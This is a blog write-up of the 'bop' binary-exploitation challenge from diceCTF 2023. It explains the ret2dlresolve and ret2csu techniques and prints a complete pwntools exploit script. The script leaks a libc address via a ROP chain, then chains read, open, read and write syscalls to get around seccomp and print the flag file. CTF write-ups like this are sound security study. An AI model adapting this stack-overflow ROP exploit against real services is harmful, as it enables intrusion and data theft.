---
title: "diceCTF 2023 - pwn: bop"
date: 2023-02-06 00:00:00 +/-0500
categories: [Cybersecurity, CTFs]
tags: [CTF, diceCTF 2023, cybersecurity, binary exploit, Ghidra, Python, Script,
ret2csu, ret2dlresolve]
---


## PWN: bop

I didn't get to solve this by my own but there were many interesting things
that I wasn't aware of that can be used to solve this challenge. However, I
wanted to talk about a few things I got to know during the struggle of working
on this challenge. 

### ret2dlresovle

- References:
  - [https://syst3mfailure.io/ret2dl_resolve](https://syst3mfailure.io/ret2dl_resolve)
  - [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)

When a binary uses the shared libraries by dynamically linking to them, they do
not have (or know) all the addresses for those library functions as the program starts up. 
They would resolve this issue (finding the addresses of those functions) when
the functions are actually called. And the trick in this technique is to force
the dynamic linker to resolve (or relocate) all the addresses of the library functions as the program starts.
The `pwntools` python library allows us to choose the functions of our choice
and and use them as their addresses were already resolved. 

### ret2csu

- References:
  - [https://ir0nstone.gitbook.io/notes/types/stack/ret2csu](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu)
  - [https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf)
  - [https://bananamafia.dev/post/x64-rop-redpwn/](https://bananamafia.dev/post/x64-rop-redpwn/)

I somehow got to know about this technique - `ret2csu` is to find more registers
(so gadgets)
when there aren't enough gadgets to use. It is possible when a binary
is dynamically linked to some code (such as glibc), `__libc_csu_init()` gets
invoked before `main()`. This function is where we can gather some useful
gadgets. 

### common exploit

Another aspect about this challenge is that there are only a few syscall that are
allowed to be used due to the seccomp setup. And there is no syscall used in the
main function so we will need to leak the address of a libc function and then
find syscalls from the libc. [This](https://ctftime.org/writeup/36143) solution
was great that it breaks down each component of their exploit so it was good for
me to look at each functionality to understand how the attack was crafted. Here
is my modified version of their solution with some comments for my own good.

```python
from pwn import *

#p = process("./bop")
p = remote("mc.ax", "30284")
#p = pwn.gdb.debug('./bop',
#'''
#b *0x4012f9
#'''
#)

offset = 40

elf = context.binary = ELF("./bop")
libc = ELF("./libc-2.31.so")

main_addr = 0x4012f9

empty_addr = 0x405000 - 0x100
# this is to be used later 
flag_size = 0x60

rop = ROP(elf)

pop_rdi = 0x4013d3
ret = 0x40101a

# leak libc 
payload = b"a" * 40
payload += p64(pop_rdi)
payload += p64(elf.got['printf'])
payload += p64(ret)
payload += p64(elf.plt['printf'])
payload += p64(ret)
payload += p64(main_addr)

p.sendlineafter(b"Do you bop?", payload)
p.recvuntil(b' ')
# reading in 6 bytes then fill the rest of 00
# unpacks the value as little-endian integer
leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("printing leak: 0x%x" % leak)
# this is 'leak of printf' - 'offset of printf' = 'libc base addr'
# until libc.address is set, libc.sym[] will get you the offests only
libc.address = leak - libc.sym['printf'] 
# make sure the address ends with 000 --- appropriate alignment
log.info("libc addr: 0x%x" %libc.address) 


# new ropper 
rl = ROP(libc)

# read the flag in --- 'flag.txt\0'
# read from the stdin - fd of 0
# read into the memory segment with 'w' permission bit on
# size of 0x10 should be enough 
# then call the read func --- libc.sym['read'] ---> now the offsets to the
# syscalls should have been resolved to the address to the read call
payload = b"a" * 40
payload += p64(pop_rdi)
payload += p64(0x0) 
payload += p64(rl.find_gadget(['pop rsi', 'ret'])[0])
payload += p64(empty_addr)
payload += p64(rl.find_gadget(['pop rdx', 'ret'])[0])
payload += p64(0x10)
payload += p64(libc.sym['read'])
payload += p64(main_addr)
p.sendlineafter(b"Do you bop?",payload)

# don't forget to actually type "flag.txt\0" in

p.sendline(b"flag.txt\0")

# open the flag file now

payload = b"a" * 40
payload += p64(pop_rdi)
payload += p64(empty_addr) # we saved 'flag.txt\0' here
payload += p64(rl.find_gadget(['pop rsi', 'ret'])[0])
payload += p64(constants.O_RDONLY) # setting read only flag
payload += p64(rl.find_gadget(['pop rax', 'ret'])[0])
payload += p64(constants.SYS_open) # open syscall number should be in rax 
# done setting up registers, call 'syscall'
#payload += p64(rl.find_gadget(['syscall', 'ret'])[0]) 
print(hex(rl.find_gadget(['syscall', 'ret'])[0]))
#print(hex(libc.address + 0x0630a9))
payload += p64(libc.address + 0x0630a9)
payload += p64(main_addr)
p.sendlineafter(b"Do you bop?", payload)

# read the file in using the fd returned from opening the file

# could not get the below idea working
# getting fd into rdi 0x05b521 is mov rax ,rdi
# libc.address + 0x05b521 will get that gadget

# reusing the read/writable memory segment
payload = b"a" * 40
payload += p64(pop_rdi)
payload += p64(0x3) # assuming
payload += p64(rl.find_gadget(['pop rsi', 'ret'])[0])
payload += p64(empty_addr)
payload += p64(rl.find_gadget(['pop rdx', 'ret'])[0])
payload += p64(flag_size)
payload += p64(rl.find_gadget(['pop rax', 'ret'])[0])
payload += p64(constants.SYS_read)
payload += p64(rl.find_gadget(['syscall', 'ret'])[0]) 
payload += p64(main_addr)
p.sendlineafter(b"Do you bop?", payload)

# write to stdout
payload = b"a" * 40
payload += p64(pop_rdi)
payload += p64(0x1) # we saved 'flag.txt\0' here
payload += p64(rl.find_gadget(['pop rsi', 'ret'])[0])
payload += p64(empty_addr) # setting read only flag
payload += p64(rl.find_gadget(['pop rdx', 'ret'])[0])
payload += p64(flag_size)
payload += p64(rl.find_gadget(['pop rax', 'ret'])[0])
payload += p64(constants.SYS_write) # open syscall number should be in rax 
# done setting up registers, call 'syscall'
payload += p64(rl.find_gadget(['syscall', 'ret'])[0]) 
payload += p64(main_addr)
p.sendlineafter(b"Do you bop?", payload)

p.interactive()

```

### Misc

This challenge provided the libc file through the dockerfile. So there was not
really a need of finding offsets of libc functions to find a libc version from
the known database (and some people complained that using this method wasn't
really working). 

## Conclusion

It was a fun(?) challenge and I picked up many new things. There are so many
things I still don't know! That is the beauty I guess!

